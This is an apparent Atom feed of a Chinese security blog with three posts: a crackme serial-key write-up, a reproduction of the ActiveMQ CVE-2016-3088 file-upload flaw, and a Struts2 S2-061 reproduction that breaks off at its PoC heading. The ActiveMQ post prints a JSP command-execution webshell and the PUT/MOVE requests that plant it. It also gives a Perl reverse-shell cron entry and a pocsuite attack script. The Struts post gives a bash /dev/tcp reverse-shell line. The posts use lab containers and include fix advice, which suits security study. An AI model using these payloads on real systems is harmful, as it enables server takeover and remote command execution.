<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ol4three</title>
  
  <subtitle>一个专注于信息安全技术的白帽子</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.ol4three.com/"/>
  <updated>2020-12-17T13:29:52.219Z</updated>
  <id>http://www.ol4three.com/</id>
  
  <author>
    <name>ol4three</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>crackme 系列之 crackme1</title>
    <link href="http://www.ol4three.com/2020/12/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/"/>
    <id>http://www.ol4three.com/2020/12/17/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme1/</id>
    <published>2020-12-17T13:12:02.000Z</published>
    <updated>2020-12-17T13:29:52.219Z</updated>
    
    <content type="html"><![CDATA[<h2 id="首先打开程序进行查看"><a href="#首先打开程序进行查看" class="headerlink" title="首先打开程序进行查看"></a>首先打开程序进行查看</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211408617.png" alt="image-20201217211408617" style="zoom:50%;"><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211534773.png" alt="image-20201217211534773" style="zoom:50%;"><p>发现无壳</p><h2 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211703604.png" alt="image-20201217211703604" style="zoom:50%;"><p>账户密码认证 直接仍进去OD进行分析 搜索关键字</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211729398.png" alt="image-20201217211729398"></p><p>在函数⼊⼝处下断点然后运⾏跟踪</p><p>输⼊11111 11111</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211749736.png" alt="image-20201217211749736" style="zoom:50%;"><p>发现关键call 和对比进入分析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211829649.png" alt="image-20201217211829649"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211843007.png" alt="image-20201217211843007"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211852605.png" alt="image-20201217211852605"></p><p>⽤户 11111</p><p>堆栈 ss:[0019F664]=0241D6A8, (ASCII “CW-4018-CRACKED”)</p><p>eax=00000005</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217211930837.png" alt="image-20201217211930837" style="zoom:50%;"><p>输⼊后成功破解</p><h2 id="对算法进行相应的破解"><a href="#对算法进行相应的破解" class="headerlink" title="对算法进行相应的破解"></a>对算法进行相应的破解</h2><p>下断点 输⼊ 11111 22222</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212049762.png" alt="image-20201217212049762"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212101828.png" alt="image-20201217212101828"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212112333.png" alt="image-20201217212112333"></p><p>发现有两次-的拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212144262.png" alt="image-20201217212144262"></p><p>CW-xxxx-CRACKED</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212206907.png" alt="image-20201217212206907"></p><p>这⾥为取第⼀⼀位 ascii码值的16进制 31 x 0x29</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212244191.png" alt="image-20201217212244191"></p><p>相乘之后为 0x7d9</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212316214.png" alt="image-20201217212316214"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212401486.png" alt="image-20201217212401486"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212426807.png" alt="image-20201217212426807"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212446924.png" alt="image-20201217212446924"></p><p>⾃身x2</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212513125.png" alt="image-20201217212513125"></p><p>之后转10进制即可</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212548980.png" alt="image-20201217212548980"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212606569.png" alt="image-20201217212606569"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212619373.png" alt="image-20201217212619373"></p><p>接下来是字符拼接</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212647428.png" alt="image-20201217212647428"></p><p>根据push关系可以推断出此处注册码为：</p><p>CW-4018-CRACKED</p><p>#####</p><p>算法脚本如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c &#x3D; input(&quot;please input a str\n&quot;)</span><br><span class="line">temp&#x3D;eval(hex(eval(hex(ord(c[0])))*eval(&#39;0x29&#39;)*eval(&#39;0x2&#39;))) </span><br><span class="line">flag &#x3D; &quot;CW-&quot; + str(temp) + &quot;-CRACKED&quot;</span><br><span class="line">print (flag)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217212906861.png" alt="image-20201217212906861"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;首先打开程序进行查看&quot;&gt;&lt;a href=&quot;#首先打开程序进行查看&quot; class=&quot;headerlink&quot; title=&quot;首先打开程序进行查看&quot;&gt;&lt;/a&gt;首先打开程序进行查看&lt;/h2&gt;&lt;img src=&quot;https://oss-map.oss-cn-beijing.
      
    
    </summary>
    
    
      <category term="Re" scheme="http://www.ol4three.com/categories/Re/"/>
    
    
      <category term="crackme" scheme="http://www.ol4three.com/tags/crackme/"/>
    
  </entry>
  
  <entry>
    <title>ActiveMQ漏洞复现分析以及POC(CVE-2016-3088)</title>
    <link href="http://www.ol4three.com/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/"/>
    <id>http://www.ol4three.com/2020/12/17/WEB/Exploit/ActiveMQ/ActiveMQ%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90%E4%BB%A5%E5%8F%8APOC-CVE-2016-3088/</id>
    <published>2020-12-17T06:50:38.000Z</published>
    <updated>2020-12-17T12:27:32.891Z</updated>
    
    <content type="html"><![CDATA[<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>影响版本：Apache ActiveMQ 5.x ~ 5.14.0</p><p> ActiveMQ在5.12.x~5.13.x默认关闭fileserver应用</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>vulhub拉取漏洞环境docker启动</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>ActiveMQ 中的 FileServer 服务允许用户通过 HTTP PUT 方法上传文件到指定目录,下载 <a href="http://archive.apache.org/dist/activemq/apache-activemq/5.7.0/activemq-parent-5.7.0-source-release.zip">ActiveMQ 5.7.0 源码</a> ，可以看到后台处理 PUT 的关键代码如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154823813.png" alt="image-20201217154823813"></p><p>用户可以上传文件到指定目录，该路径在 <code>conf/jetty.xml</code> 中定义，如下</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p><p>顺着 PUT 方法追踪，可以看到调用了如下函数</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155145859.png" alt="image-20201217155145859"></p><p>同时看到后台处理 MOVE 的关键代码如下，可以看到该方法没有对目的路径做任何限制或者过滤。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217155615911.png" alt="image-20201217155615911"></p><p>由此，我们可以构造PUT请求上传 webshell 到 fileserver 目录，然后通过 Move 方法将其移动到有执行权限的 admin/ 目录。</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><h3 id="1-上传webshell"><a href="#1-上传webshell" class="headerlink" title="1.上传webshell"></a>1.上传webshell</h3><p>可以爆破目录(未复现成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;test&#x2F;123&#x2F;123 HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 4</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure><p>admin 登陆查看目录</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151345913.png" alt="image-20201217151345913"></p><p>首先 PUT 一个  Webshell 的txt到 fileserver 目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Content-Length: 330</span><br><span class="line"></span><br><span class="line">&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;</span><br><span class="line">&lt;%</span><br><span class="line"> out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);</span><br><span class="line"> String line&#x3D;null;</span><br><span class="line"> Process p&#x3D;Runtime.getRuntime().exec(strcmd);</span><br><span class="line"> BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</span><br><span class="line"></span><br><span class="line"> while((line&#x3D;br.readLine())!&#x3D;null)&#123;</span><br><span class="line">  out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217151116478.png" alt="image-20201217151116478"></p><p>查看发现上传成功</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152139322.png" alt="image-20201217152139322"></p><p>由于上传的是文本文件并不能被服务器解析，所以我们下一步要利用MOVE方法将上传的webshell移动到可以执行的目录并更改后缀为jsp。</p><p>可以解析jsp文件的路径有：</p><p>1．/opt/activemq/webapps/api</p><p>2．/opt/activemq/webapps/admin</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Language: en-US,en;q&#x3D;0.9,zh-CN;q&#x3D;0.8,zh;q&#x3D;0.7</span><br><span class="line">Cookie: JSESSIONID&#x3D;node016s6o5xkj6jyp130d905yk3j4l1.node0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>这里有一个坑，困惑了我很久，我的方法步骤都没有问题为什么MOVE方法会一直响应超时并且得不到任何响应的内容。尝试了很久，我一度怀疑我的</p><p>vulhub环境有问题，一次偶然中我用burp抓到的包去修改执行MOVE方法很快就得到了响应结果，神奇的是把这个数据包重新复制到repeater执行再次出现</p><p>响应超时的结果，明明是两个相同的数据包，真是令人费解，有的时候在正常渗透测试过程也会发现这个情况，根据xssle师傅分析可能是MOVE方法不稳定导致的</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152440918.png" alt="image-20201217152440918"></p><p>然后访问即可</p><p><a href="http://172.20.10.3:8161/api/1.jsp?cmd=ls">http://172.20.10.3:8161/api/1.jsp?cmd=ls</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217152645064.png" alt="image-20201217152645064"></p><h3 id="2-计划任务反弹"><a href="#2-计划任务反弹" class="headerlink" title="2.计划任务反弹"></a>2.计划任务反弹</h3><p>写入反弹计划命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 172.20.10.3:8161</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 250</span><br><span class="line"></span><br><span class="line">*&#x2F;1 * * * * root &#x2F;usr&#x2F;bin&#x2F;perl -e &#39;use Socket;$i&#x3D;&quot;ip&quot;;$p&#x3D;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;sh -i&quot;);&#125;;&#39;</span><br></pre></td></tr></table></figure><p>移动到/etc/cron.d/目录下，遇到ubuntu目录不太一样，参考<a href="https://m3lon.github.io/2019/03/18/解决ubuntu-crontab反弹shell失败的问题/">这里</a></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153434585.png" alt="image-20201217153434585"></p><h3 id="3-写入ssh密钥"><a href="#3-写入ssh密钥" class="headerlink" title="3.写入ssh密钥"></a>3.写入ssh密钥</h3><p>docker未安装ssh未复现，可参考<a href="https://www.secpulse.com/archives/60064.html">这里</a></p><h3 id="Metasploit-反弹shell"><a href="#Metasploit-反弹shell" class="headerlink" title="Metasploit 反弹shell"></a>Metasploit 反弹shell</h3><p>进入metasploit，搜索2016-3088</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217153915502.png" alt="image-20201217153915502"></p><p>直接淦就完事了</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154031247.png" alt="image-20201217154031247"></p><h2 id="poc编写"><a href="#poc编写" class="headerlink" title="poc编写"></a>poc编写</h2><p>根据漏洞的原理进行编写    验证模块PUT成功即可  攻击模块进行MOVE操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">from pocsuite.net import req</span><br><span class="line">from pocsuite.poc import POCBase,Output</span><br><span class="line">from pocsuite.utils import register</span><br><span class="line"></span><br><span class="line">class ActiveMQPoc(POCBase):</span><br><span class="line">vulID &#x3D; &#39;002&#39;</span><br><span class="line">version &#x3D; &#39;1.0&#39;</span><br><span class="line">author &#x3D; [&#39;ol4three&#39;]</span><br><span class="line">vulDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">updateDate &#x3D; &#39;2020-12-17&#39;</span><br><span class="line">references &#x3D; [&#39;https:&#x2F;&#x2F;paper.seebug.org&#x2F;346&#x2F;&#39;]</span><br><span class="line">name &#x3D; &#39;Apache ActiveMQ (CVE-2016-3088)&#39;</span><br><span class="line">appPowerLink &#x3D; &#39;activemq.apache.org&#39;</span><br><span class="line">appName &#x3D; &#39;Apache activemq&#39;</span><br><span class="line">appVersion &#x3D; &#39; Apache ActiveMQ 5.14.0&#39;</span><br><span class="line">vulType &#x3D; &#39;Arbitrary File Reading&#39;</span><br><span class="line">desc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> fileserverfileserverjsp\</span><br><span class="line"> MOVEMOVE</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">pocDesc &#x3D; &#39;&#39;&#39;</span><br><span class="line"> pocsuite -r ***.py -u target --verify&quot;</span><br><span class="line"> &#39;&#39;&#39;</span><br><span class="line">samples &#x3D; []</span><br><span class="line">install_requires &#x3D; []</span><br><span class="line"></span><br><span class="line">def _verify(self):</span><br><span class="line"> result &#x3D; &#123;&#125;</span><br><span class="line"> path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line"> path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;ls&quot;</span><br><span class="line"> url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line"> try:</span><br><span class="line"> resp &#x3D; req.put(url)</span><br><span class="line"> resp1 &#x3D; req.get(url)</span><br><span class="line"> if (resp.status_code &#x3D;&#x3D; 204 and str(resp1.status_code)[0] in (&#39;2&#39;, &#39;3&#39;)):</span><br><span class="line"> result[&#39;VerifyInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line"> result[&#39;VerifyInfo&#39;][&#39;URL&#39;] &#x3D; url</span><br><span class="line"></span><br><span class="line"> except Exception as ex:</span><br><span class="line"> pass</span><br><span class="line"></span><br><span class="line"> return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">def parse_output(self, result):</span><br><span class="line"> output &#x3D; Output(self)</span><br><span class="line"> if result:</span><br><span class="line"> output.success(result)</span><br><span class="line"> else:</span><br><span class="line"> output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line"> return output</span><br><span class="line"></span><br><span class="line">def _attack(self):</span><br><span class="line">result &#x3D; &#123;&#125;</span><br><span class="line">path &#x3D; &quot;fileserver&#x2F;1.txt&quot;</span><br><span class="line">path1 &#x3D; &quot;api&#x2F;1.jsp?cmd&#x3D;id&quot;</span><br><span class="line">url &#x3D; self.url + &#39;&#x2F;&#39; + path</span><br><span class="line">url1 &#x3D; self.url + &#39;&#x2F;&#39; + path1</span><br><span class="line">data1 &#x3D; &#39;1&#39;</span><br><span class="line">data &#x3D; &#39;&lt;%@ page import&#x3D;&quot;java.io.*&quot;%&gt;&lt;%out.print(&quot;Hello&lt;&#x2F;br&gt;&quot;);String strcmd&#x3D;request.getParameter(&quot;cmd&quot;);String line&#x3D;null;Process p&#x3D;Runtime.getRuntime().exec(strcmd);BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));while((line&#x3D;br.readLine())!&#x3D;null)&#123;out.print(line+&quot;&lt;&#x2F;br&gt;&quot;);&#125;%&gt;&#39;</span><br><span class="line"></span><br><span class="line">headers &#x3D;&#123;</span><br><span class="line"> &#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;1.jsp&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers1&#x3D;&#123;</span><br><span class="line">&#39;Authorization&#39;:&#39;Basic YWRtaW46YWRtaW4&#x3D;&#39;,</span><br><span class="line">&#39;Connection&#39;:&#39;close&#39;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">try:</span><br><span class="line">resp &#x3D; req.put(url,data&#x3D;data)</span><br><span class="line">resp1 &#x3D; req.get(url)</span><br><span class="line">resp2 &#x3D; req.request(&#39;MOVE&#39;,url&#x3D;url,headers&#x3D;&#123;&#39;Destination&#39; : &#39;file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;api&#x2F;2.jsp&#39;&#125;)</span><br><span class="line">resp3 &#x3D; req.get(url1,headers&#x3D;headers1)</span><br><span class="line">resp3 &#x3D; resp3.text[12:50]</span><br><span class="line">result[&#39;AdminInfo&#39;] &#x3D; &#123;&#125;</span><br><span class="line">result[&#39;AdminInfo&#39;][&#39;SHELL&#39;] &#x3D; url1</span><br><span class="line">result[&#39;AdminInfo&#39;][&#39;EXEC &#39;] &#x3D; resp3</span><br><span class="line">except Exception as ex:</span><br><span class="line">pass</span><br><span class="line"></span><br><span class="line">return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">register(ActiveMQPoc)</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217173751874.png" alt="image-20201217173751874"></p><h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>1、ActiveMQ Fileserver 的功能在 5.14.0 及其以后的版本中已被移除。建议用户升级至 5.14.0 及其以后版本。</p><p>2、通过移除 <code>conf\jetty.xml</code> 的以下配置来禁用 ActiveMQ Fileserver 功能</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217154544956.png" alt="image-20201217154544956"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://paper.seebug.org/346/">https://paper.seebug.org/346/</a></p><p><a href="http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/">http://tengxiaofei.run/2020/06/09/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-Apache%20ActiveMQ/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;影响版本&quot;&gt;&lt;a href=&quot;#影响版本&quot; class=&quot;headerlink&quot; title=&quot;影响版本&quot;&gt;&lt;/a&gt;影响版本&lt;/h2&gt;&lt;p&gt;影响版本：Apache ActiveMQ 5.x ~ 5.14.0&lt;/p&gt;
&lt;p&gt; ActiveMQ在5.12.x~5.13
      
    
    </summary>
    
    
      <category term="WEB安全" scheme="http://www.ol4three.com/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ActiveMQ" scheme="http://www.ol4three.com/tags/ActiveMQ/"/>
    
  </entry>
  
  <entry>
    <title>Struts2 S2-061 远程命令执行漏洞(CVE-2020-17530)复现以及脚本编写</title>
    <link href="http://www.ol4three.com/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/"/>
    <id>http://www.ol4three.com/2020/12/16/WEB/Exploit/struts2/Struts2-S2-061-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-CVE-2020-17530-%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-16T11:33:17.000Z</published>
    <updated>2020-12-16T13:05:25.544Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞，开发人员使用了 %{…} 语法，从而攻击者可以通过构Payload，从而造成远程代码执行。</p><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Struts2：2.0.0 - 2.5.25</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;vulhub&#x2F;vulhub&#x2F;tree&#x2F;master&#x2F;struts2&#x2F;s2-061</span><br><span class="line"></span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><h4 id="查看端口"><a href="#查看端口" class="headerlink" title="查看端口"></a>查看端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">╰─$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE                   COMMAND                  CREATED             STATUS              PORTS                    NAMES</span><br><span class="line">e60ea5e361ff        vulhub&#x2F;struts2:2.5.25   &quot;&#x2F;usr&#x2F;local&#x2F;bin&#x2F;mvn-…&quot;   34 minutes ago      Up 34 minutes       0.0.0.0:8080-&gt;8080&#x2F;tcp   s2-061_struts2_1</span><br></pre></td></tr></table></figure><h4 id="访问漏洞环境"><a href="#访问漏洞环境" class="headerlink" title="访问漏洞环境"></a>访问漏洞环境</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194045330.png" alt="image-20201216194045330"></p><h4 id="测试漏洞是否存在"><a href="#测试漏洞是否存在" class="headerlink" title="测试漏洞是否存在"></a>测试漏洞是否存在</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216194318514.png" alt="image-20201216194318514"></p><h4 id="直接执行命令"><a href="#直接执行命令" class="headerlink" title="直接执行命令"></a>直接执行命令</h4><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216201525731.png" alt="image-20201216201525731"></p><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>通过在线地址将bash反弹命令进行进行编码转换</p><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html">http://www.jackson-t.ca/runtime-exec-payloads.html</a></p><p>bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216210508614.png" alt="image-20201216210508614"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201216205907765.png" alt="image-20201216205907765"></p><h4 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h4><figure class="highlight python"><table><tr><td 